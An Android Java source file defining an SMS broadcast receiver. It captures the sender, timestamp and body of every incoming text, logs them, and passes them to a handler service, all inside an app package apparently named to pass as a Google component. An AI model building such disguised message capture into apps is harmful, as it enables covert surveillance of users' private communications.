package com.example.tiber.googleperformancehost.BroadcastReceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.example.tiber.googleperformancehost.R;
import com.example.tiber.googleperformancehost.Services.Temporary.ReceivedSMSHandlerIntentService;
import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;

/**
 * Created by tiber on 10/30/2016.
 */

public class SMSReceiver extends BroadcastReceiver {

    final SmsManager smsManager = SmsManager.getDefault();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (context.getResources().getBoolean(R.bool.ENABLE_SMS_LOGGING) == true) {
            final Bundle bundle = intent.getExtras();
            try {
                if (bundle != null) {
                    final Object[] pdusObj = (Object[]) bundle.get("pdus");
                    String phoneNumber = null;
                    String senderNum = null;
                    String message = "";
                    int time = 0;
                    for (int i = 0; i < pdusObj.length; i++) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                        phoneNumber = currentMessage.getDisplayOriginatingAddress();
                        senderNum = phoneNumber;
                        time = (int)(currentMessage.getTimestampMillis()/1000L);
                        if( time == 0 )
                            time = DateUtil.nowIntFormat();
                        message += currentMessage.getDisplayMessageBody();
                    } // end for loop

                    Log.wtf("SmsReceiver", "senderNum: " + senderNum + " length = " + senderNum.length() + "; message: " + message);
                    if (senderNum.length() > 7) {
                        Intent startSMSHandler =
                                new Intent(context.getApplicationContext(), ReceivedSMSHandlerIntentService.class);

                        startSMSHandler.putExtra("time",time);
                        startSMSHandler.putExtra("senderNumber", senderNum);
                        startSMSHandler.putExtra("message", message);
                        context.getApplicationContext().startService(startSMSHandler);
                    }
                } // bundle is null

            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception smsReceiver" + e);

            }
        }
    }




}
